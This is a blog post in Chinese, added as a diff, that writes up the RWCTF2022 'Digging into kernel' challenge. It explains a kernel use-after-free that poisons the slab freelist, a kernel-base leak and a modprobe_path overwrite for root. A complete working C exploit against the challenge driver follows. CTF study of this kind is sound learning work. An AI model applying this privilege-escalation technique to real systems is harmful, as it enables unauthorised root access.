@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="先跳过了条件竞争，堆喷遇到一个大问题就是nokaslr的时候利用不成功（好像是分配的时候出了问题），但开kaslr的时候调试不了……所以也先跳过了，这个看起来比较简单就先搞这个(⊙﹏⊙)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel Heap Arbitrary-Address-Allocation">
+<meta property="og:url" content="http://akaieurus.github.io/2023/08/18/kernel-heap-aaa/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="先跳过了条件竞争，堆喷遇到一个大问题就是nokaslr的时候利用不成功（好像是分配的时候出了问题），但开kaslr的时候调试不了……所以也先跳过了，这个看起来比较简单就先搞这个(⊙﹏⊙)">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-08-18T08:47:59.000Z">
+<meta property="article:modified_time" content="2023-08-18T16:05:01.857Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="Heap">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/08/18/kernel-heap-aaa/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Kernel Heap Arbitrary-Address-Allocation | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/08/18/kernel-heap-aaa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kernel Heap Arbitrary-Address-Allocation
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-08-18 16:47:59" itemprop="dateCreated datePublished" datetime="2023-08-18T16:47:59+08:00">2023-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-08-19 00:05:01" itemprop="dateModified" datetime="2023-08-19T00:05:01+08:00">2023-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kernel/Heap/" itemprop="url" rel="index"><span itemprop="name">Heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>先跳过了条件竞争，堆喷遇到一个大问题就是nokaslr的时候利用不成功（好像是分配的时候出了问题），但开kaslr的时候调试不了……所以也先跳过了，这个看起来比较简单就先搞这个(⊙﹏⊙)</p>
+<span id="more"></span>
+
+<p>利用方式就是通过UAF更改object的next指针实现任意地址分配没啥好说的</p>
+<p>上例题！</p>
+<h2 id="例题：RWCTF2022高校赛-Digging-into-kernel"><a href="#例题：RWCTF2022高校赛-Digging-into-kernel" class="headerlink" title="例题：RWCTF2022高校赛 - Digging into kernel"></a>例题：RWCTF2022高校赛 - Digging into kernel</h2><p>主要分两步：泄露kernel基址和提权</p>
+<h3 id="泄露kernel基址"><a href="#泄露kernel基址" class="headerlink" title="泄露kernel基址"></a>泄露kernel基址</h3><p>分两步</p>
+<ul>
+<li>通过object的next指针泄露一个堆中的地址来猜page_offset_base</li>
+<li>page_offset_base+0x9d000处是secondary_startup_64的地址，可以由此计算kernel基址</li>
+</ul>
+<p><strong>为什么page_offset_base+0x9d000是secondary_startup_64的地址：</strong></p>
+<p>0xffff888000000000-0xffffc87fffffffff是物理地址的线性映射区，所以page_offset_base+0x9d000应该是物理地址0x9d000，属于保护模式使用的内存区域，但这个地址在进入长模式时的内容还是0，所以这是为什么我也不知道（</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>覆写modprobe_path以root执行程序：</p>
+<p>当执行（execve）一个非法的文件（file magic not found），会以root权限执行以modprobe_path为路径的可执行文件（默认值为&#x2F;sbin&#x2F;modprobe）</p>
+<p>可以将modprobe_path更改为恶意脚本的路径（exp中间是改变flag的权限）</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0x1444700</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *content;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> data *data_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x7777777</span>, data_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> data *data_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1111111</span>, data_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> data *data_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666666</span>, data_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo \&quot;#!/bin/sh\nchmod 777 /flag\&quot; &gt; /home/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd[<span class="number">3</span>], i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(fd[i] &lt; <span class="number">0</span>)</span><br><span class="line">            fail_print(<span class="string">&quot;Open Fail!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data</span> <span class="title">mydata</span>;</span></span><br><span class="line">    mydata.content = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    mydata.index = <span class="number">0</span>;</span><br><span class="line">    mydata.size = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(mydata.content, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    alloc_buf(fd[<span class="number">0</span>], &amp;mydata);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    read_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line">    <span class="type">size_t</span> heap_base = mydata.content[<span class="number">0</span>] &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Get the heap base : 0x%lx\033[0m\n&quot;</span>, heap_base);</span><br><span class="line"></span><br><span class="line">    mydata.content[<span class="number">0</span>] = (<span class="type">size_t</span>)(heap_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>);</span><br><span class="line">    mydata.index = <span class="number">0</span>;</span><br><span class="line">    mydata.size = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    write_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line"></span><br><span class="line">    mydata.size = <span class="number">0x18</span>;</span><br><span class="line">    alloc_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line">    alloc_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line">    read_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base = mydata.content[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">if</span>((kernel_base &amp; <span class="number">0xfff</span>) != <span class="number">0</span>)</span><br><span class="line">        fail_print(<span class="string">&quot;Leak Kernel Base Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Get kernel base : 0x%lx\033[0m\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    alloc_buf(fd[<span class="number">1</span>], &amp;mydata);</span><br><span class="line">    close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    mydata.size = <span class="number">8</span>;</span><br><span class="line">    mydata.content[<span class="number">0</span>] = MODPROBE_PATH - <span class="number">0x10</span> + kernel_base;</span><br><span class="line">    write_buf(fd[<span class="number">2</span>], &amp;mydata);</span><br><span class="line"></span><br><span class="line">    alloc_buf(fd[<span class="number">2</span>], &amp;mydata);</span><br><span class="line">    alloc_buf(fd[<span class="number">2</span>], &amp;mydata);</span><br><span class="line">    mydata.content[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    mydata.content[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    mydata.size = <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;mydata.content[<span class="number">2</span>], <span class="string">&quot;/home/getshell\0&quot;</span>);</span><br><span class="line">    write_buf(fd[<span class="number">2</span>], &amp;mydata);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">        fail_print(<span class="string">&quot;Fail Open flag!&quot;</span>);</span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] flag : %s\033[0m\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/Heap/" rel="tag"># Heap</a>
+              <a href="/tags/UAF/" rel="tag"># UAF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/16/kernel-heap-uaf/" rel="prev" title="Kernel Heap UAF">
+      <i class="fa fa-chevron-left"></i> Kernel Heap UAF
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9ARWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B-Digging-into-kernel"><span class="nav-number">1.</span> <span class="nav-text">例题：RWCTF2022高校赛 - Digging into kernel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2kernel%E5%9F%BA%E5%9D%80"><span class="nav-number">1.1.</span> <span class="nav-text">泄露kernel基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
